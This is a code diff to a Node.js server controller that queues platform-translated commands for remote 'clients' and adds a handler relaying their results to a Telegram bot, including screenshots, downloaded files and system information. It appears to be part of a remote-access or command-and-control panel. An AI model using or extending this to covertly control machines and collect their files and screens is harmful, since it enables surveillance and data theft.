@@ -1,5 +1,6 @@
 const Task = require('../models/Task');
 const Client = require('../models/Client');
+const telegramService = require('../services/telegramService');
 
 // Platform-specific command mappings
 const PLATFORM_COMMANDS = {
@@ -186,12 +187,28 @@ const sendScriptToClientAction = async (req, res) => {
 
         await task.save();
 
+        // Send Telegram notification if enabled
+        if (telegramService.isEnabled()) {
+            try {
+                await telegramService.sendCommandOutput(
+                    client,
+                    command,
+                    `Command queued for execution: ${translatedCommand}`,
+                    'text'
+                );
+            } catch (telegramError) {
+                console.error('Failed to send Telegram notification:', telegramError);
+                // Don't fail the main request if Telegram fails
+            }
+        }
+
         res.json({ 
             success: true, 
             message: 'Command sent successfully',
             taskId: task._id,
             translatedCommand: translatedCommand,
-            platform: operatingSystem
+            platform: operatingSystem,
+            telegramSent: telegramService.isEnabled()
         });
     } catch (error) {
         console.error('Error in sendScriptToClientAction:', error);
@@ -314,9 +331,91 @@ const validateCommandAction = async (req, res) => {
     }
 };
 
+// Handle command result from client
+const handleCommandResultAction = async (req, res) => {
+    try {
+        const { uuid, taskId, result, status, outputType, fileData } = req.body;
+        
+        if (!uuid || !taskId || !result) {
+            return res.status(400).json({ 
+                success: false, 
+                message: 'UUID, taskId, and result are required' 
+            });
+        }
+
+        // Update task status
+        const task = await Task.findById(taskId);
+        if (!task) {
+            return res.status(404).json({ 
+                success: false, 
+                message: 'Task not found' 
+            });
+        }
+
+        task.status = status || 'completed';
+        task.result = result;
+        task.completedAt = new Date();
+        await task.save();
+
+        // Get client information
+        const client = await Client.findOne({ uuid: uuid });
+        if (!client) {
+            return res.status(404).json({ 
+                success: false, 
+                message: 'Client not found' 
+            });
+        }
+
+        // Send Telegram notification if enabled
+        if (telegramService.isEnabled()) {
+            try {
+                switch (outputType) {
+                    case 'screenshot':
+                        if (fileData) {
+                            const imageBuffer = Buffer.from(fileData, 'base64');
+                            await telegramService.sendScreenshot(client, imageBuffer, `Screenshot from ${client.computerName}`);
+                        }
+                        break;
+                    case 'file':
+                        if (fileData) {
+                            const fileBuffer = Buffer.from(fileData, 'base64');
+                            const fileName = `download_${Date.now()}.bin`;
+                            await telegramService.sendFile(client, fileName, fileBuffer, `File downloaded from ${client.computerName}`);
+                        }
+                        break;
+                    case 'system-info':
+                        await telegramService.sendSystemInfo(client, result);
+                        break;
+                    case 'text':
+                    default:
+                        await telegramService.sendCommandOutput(client, task.command, result, 'text');
+                        break;
+                }
+            } catch (telegramError) {
+                console.error('Failed to send Telegram notification:', telegramError);
+                // Don't fail the main request if Telegram fails
+            }
+        }
+
+        res.json({ 
+            success: true, 
+            message: 'Command result processed successfully',
+            telegramSent: telegramService.isEnabled()
+        });
+    } catch (error) {
+        console.error('Error in handleCommandResultAction:', error);
+        res.status(500).json({ 
+            success: false, 
+            message: 'Internal server error',
+            error: error.message 
+        });
+    }
+};
+
 module.exports = {
     sendScriptToClientAction,
     getTasksForClientAction,
     getAvailableCommandsAction,
-    validateCommandAction
+    validateCommandAction,
+    handleCommandResultAction
 };
